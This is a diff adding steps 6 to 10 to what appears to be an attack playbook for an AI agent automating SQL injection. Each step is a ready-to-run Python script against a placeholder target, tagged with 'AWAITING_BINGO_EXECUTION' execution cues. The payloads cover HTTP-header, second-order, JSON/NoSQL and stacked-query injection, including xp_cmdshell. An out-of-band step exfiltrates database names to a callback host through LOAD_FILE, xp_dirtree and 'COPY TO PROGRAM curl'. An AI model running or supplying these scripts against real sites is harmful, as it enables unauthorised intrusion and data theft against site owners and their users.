@@ -636,6 +636,260 @@ Apply encoding/obfuscation to payloads:
   - HTTP header: X-Forwarded-For: 127.0.0.1, X-Real-IP: 127.0.0.1
   - Time-based fallback: IF(condition, SLEEP(3), 0)
 
+STEP 6 — HTTP Header Injection (when GET/POST params all blocked):
+When all URL parameters fail, inject via HTTP headers. Many backends log/use these unsanitized.
+```python
+import urllib.request, urllib.parse, ssl, time
+
+ssl._create_default_https_context = ssl._create_unverified_context
+TARGET = "TARGET_URL"
+BASELINE_LEN = 0  # measure first
+
+def req_header(extra_headers: dict):
+    hdrs = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        **extra_headers
+    }
+    rq = urllib.request.Request(TARGET, headers=hdrs)
+    try:
+        with urllib.request.urlopen(rq, timeout=10) as r:
+            return len(r.read()), r.status
+    except urllib.error.HTTPError as e:
+        return 0, e.code
+    except:
+        return -1, -1
+
+# Baseline
+L0, S0 = req_header({})
+print(f"Baseline: {L0}B status={S0}")
+
+# Header injection candidates
+candidates = [
+    ("X-Forwarded-For",  "1' AND SLEEP(3)-- -"),
+    ("X-Forwarded-For",  "1 AND 1=1-- -"),
+    ("User-Agent",       "Mozilla' AND SLEEP(3)-- -"),
+    ("Referer",          f"{TARGET}' AND SLEEP(3)-- -"),
+    ("X-Real-IP",        "1' OR SLEEP(3)-- -"),
+    ("Accept-Language",  "en' AND SLEEP(3)-- -"),
+    ("Cookie",           "session=1' AND SLEEP(3)-- -"),
+]
+
+for hdr, payload in candidates:
+    t0 = time.time()
+    L, S = req_header({hdr: payload})
+    elapsed = time.time() - t0
+    diff = abs(L - L0)
+    flag = "⚠ DELAY" if elapsed > 2.5 else ("⚠ LEN_DIFF" if diff > 100 else "")
+    print(f"  {hdr}: status={S} len={L}B elapsed={elapsed:.2f}s {flag}")
+    time.sleep(0.5)
+```
+AWAITING_BINGO_EXECUTION
+
+STEP 7 — Second-order Injection (stored SQLi):
+When the site has registration/profile/comment features, injection may fire on a different page.
+Strategy:
+1. Register/submit with payload as username/profile field: admin'-- or 1' AND SLEEP(3)-- -
+2. Then visit the page that DISPLAYS or USES that stored value
+3. Observe if the stored payload causes SQL errors or delays on the display page
+```python
+import urllib.request, urllib.parse, ssl, time, json
+
+ssl._create_default_https_context = ssl._create_unverified_context
+
+# Step 1: Store the payload (example: registration form)
+REGISTER_URL = "REGISTER_URL"
+DISPLAY_URL  = "DISPLAY_URL_THAT_USES_STORED_VALUE"
+
+payloads = [
+    "test'-- -",
+    "test' AND SLEEP(3)-- -",
+    "test' AND 1=1-- -",
+]
+
+for p in payloads:
+    # POST registration
+    data = urllib.parse.urlencode({"username": p, "email": "test@test.com", "password": "Test1234!"}).encode()
+    rq = urllib.request.Request(REGISTER_URL, data=data, method="POST",
+        headers={"Content-Type": "application/x-www-form-urlencoded",
+                 "User-Agent": "Mozilla/5.0"})
+    try:
+        with urllib.request.urlopen(rq, timeout=10) as r:
+            print(f"Register '{p[:30]}': status={r.status}")
+    except Exception as e:
+        print(f"Register error: {e}")
+
+    # Step 2: Access display page and check for delay/error
+    t0 = time.time()
+    try:
+        with urllib.request.urlopen(urllib.request.Request(DISPLAY_URL,
+            headers={"User-Agent": "Mozilla/5.0"}), timeout=15) as r:
+            body = r.read().decode("utf-8", "replace")
+            elapsed = time.time() - t0
+            print(f"Display page: len={len(body)}B elapsed={elapsed:.2f}s")
+            if elapsed > 2.5:
+                print(f"  ⚠ SECOND-ORDER TIME DELAY with payload: {p}")
+    except Exception as e:
+        elapsed = time.time() - t0
+        print(f"Display error (elapsed={elapsed:.2f}s): {e}")
+    time.sleep(1)
+```
+AWAITING_BINGO_EXECUTION
+
+STEP 8 — JSON/API Injection (REST API endpoints):
+When target uses JSON API, standard URL param injection won't work. Inject inside JSON body.
+```python
+import urllib.request, urllib.parse, ssl, time, json
+
+ssl._create_default_https_context = ssl._create_unverified_context
+API_URL = "API_ENDPOINT"
+
+def api_req(body: dict):
+    data = json.dumps(body).encode()
+    rq = urllib.request.Request(API_URL, data=data, method="POST", headers={
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0",
+        "Accept": "application/json",
+    })
+    try:
+        with urllib.request.urlopen(rq, timeout=10) as r:
+            body_resp = r.read()
+            return len(body_resp), r.status, body_resp.decode("utf-8","replace")[:200]
+    except urllib.error.HTTPError as e:
+        return 0, e.code, ""
+    except:
+        return -1, -1, ""
+
+# Baseline
+L0, S0, _ = api_req({"id": 1})
+print(f"Baseline: {L0}B status={S0}")
+
+# JSON injection variants
+json_payloads = [
+    {"id": "1 AND 1=1-- -"},
+    {"id": "1 AND 1=2-- -"},
+    {"id": "1' AND SLEEP(3)-- -"},
+    {"id": {"$gt": 0}},          # NoSQL injection (MongoDB)
+    {"id": {"$where": "sleep(3000) || true"}},  # NoSQL time-based
+]
+for p in json_payloads:
+    t0 = time.time()
+    L, S, preview = api_req(p)
+    elapsed = time.time() - t0
+    flag = "⚠ DELAY" if elapsed > 2.5 else ("⚠ DIFF" if abs(L-L0) > 50 else "")
+    print(f"  {str(p)[:50]}: status={S} len={L}B elapsed={elapsed:.2f}s {flag}")
+    time.sleep(0.3)
+```
+AWAITING_BINGO_EXECUTION
+
+STEP 9 — Stacked Queries (MSSQL/PostgreSQL/SQLite):
+Use `;` to stack multiple queries. MySQL mostly blocks this, but MSSQL/PostgreSQL/SQLite allow it.
+Useful for: INSERT/UPDATE/DROP, xp_cmdshell (MSSQL), COPY TO (PostgreSQL).
+```python
+import urllib.request, urllib.parse, ssl, time
+
+ssl._create_default_https_context = ssl._create_unverified_context
+TARGET = "URL_WITH_PARAM"
+PARAM  = "PARAM_NAME"
+ORIG   = "ORIGINAL_VALUE"
+
+parsed = urllib.parse.urlparse(TARGET)
+qs = dict(urllib.parse.parse_qsl(parsed.query))
+hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+
+def req(payload):
+    qs[PARAM] = ORIG + payload
+    url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path,
+        parsed.params, urllib.parse.urlencode(qs), ""))
+    t0 = time.time()
+    try:
+        with urllib.request.urlopen(urllib.request.Request(url, headers=hdrs), timeout=12) as r:
+            body = r.read()
+            return len(body), r.status, time.time()-t0
+    except urllib.error.HTTPError as e:
+        return 0, e.code, time.time()-t0
+    except:
+        return -1, -1, time.time()-t0
+
+L0, S0, _ = req("")
+print(f"Baseline: {L0}B status={S0}")
+
+stacked = [
+    # Time-based stacked (MSSQL)
+    ("; WAITFOR DELAY '0:0:3'-- -",         "MSSQL time"),
+    ("; SELECT SLEEP(3)-- -",               "MySQL stacked sleep"),
+    # PostgreSQL
+    ("; SELECT pg_sleep(3)-- -",            "PostgreSQL sleep"),
+    # Error-based stacked
+    ("; SELECT 1/0-- -",                    "Division by zero"),
+    # MSSQL xp_cmdshell probe
+    ("; EXEC xp_cmdshell('ping 127.0.0.1')-- -", "MSSQL xp_cmdshell"),
+    # SQLite
+    ("; SELECT sqlite_version()-- -",       "SQLite"),
+]
+
+for payload, label in stacked:
+    L, S, elapsed = req(payload)
+    flag = "⚠ DELAY" if elapsed > 2.5 else ("⚠ DIFF" if abs(L-L0)>100 else "")
+    print(f"  [{label}]: status={S} len={L}B elapsed={elapsed:.2f}s {flag}")
+    time.sleep(0.5)
+```
+AWAITING_BINGO_EXECUTION
+
+STEP 10 — Out-of-Band (OOB) Injection (when WAF blocks all in-band responses):
+Use DNS/HTTP callback to exfiltrate data. Requires an external listener (use interactsh or own server).
+Works when: WAF blocks all responses but allows outbound DNS/HTTP from the DB server.
+```python
+import urllib.request, urllib.parse, ssl, time
+
+ssl._create_default_https_context = ssl._create_unverified_context
+TARGET = "URL_WITH_PARAM"
+PARAM  = "PARAM_NAME"
+ORIG   = "ORIGINAL_VALUE"
+# Use interactsh public server OR your own: python3 -m http.server 8080
+OOB_HOST = "YOUR_OOB_DOMAIN_OR_IP"  # e.g. xxxxx.oast.fun from interactsh
+
+parsed = urllib.parse.urlparse(TARGET)
+qs = dict(urllib.parse.parse_qsl(parsed.query))
+hdrs = {"User-Agent": "Mozilla/5.0"}
+
+def req(payload):
+    qs[PARAM] = ORIG + payload
+    url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path,
+        parsed.params, urllib.parse.urlencode(qs), ""))
+    try:
+        with urllib.request.urlopen(urllib.request.Request(url, headers=hdrs), timeout=15) as r:
+            return r.status
+    except urllib.error.HTTPError as e:
+        return e.code
+    except:
+        return -1
+
+# MySQL OOB via LOAD_FILE + DNS
+oob_payloads = [
+    # MySQL — DNS exfil via LOAD_FILE (requires FILE privilege)
+    f" AND LOAD_FILE(CONCAT('\\\\\\\\',database(),'.{OOB_HOST}\\\\a'))-- -",
+    # MySQL — INTO OUTFILE to trigger DNS (if FILE priv)
+    f" UNION SELECT load_file(0x2f2f{OOB_HOST.encode().hex()}2f)-- -",
+    # MSSQL — DNS via xp_dirtree
+    f"; EXEC master..xp_dirtree '\\\\{OOB_HOST}\\share'-- -",
+    # MSSQL — DNS via xp_fileexist
+    f"; EXEC master..xp_fileexist '\\\\{OOB_HOST}\\share'-- -",
+    # PostgreSQL — COPY TO http (if pg_read_file available)
+    f"; COPY (SELECT database()) TO PROGRAM 'curl http://{OOB_HOST}/'-- -",
+]
+
+print(f"OOB host: {OOB_HOST}")
+print("Sending OOB payloads — check your listener for incoming DNS/HTTP requests:")
+for p in oob_payloads:
+    s = req(p)
+    print(f"  status={s}  payload={p[:60]}")
+    time.sleep(1)
+
+print("If OOB_HOST received DNS/HTTP — OUT-OF-BAND INJECTION CONFIRMED")
+print("Data will appear in DNS query subdomain or HTTP request path")
+```
+AWAITING_BINGO_EXECUTION
+
 === [7] RECON — WRITE YOUR OWN ===
 Tech stack fingerprinting without external tools:
 ```python
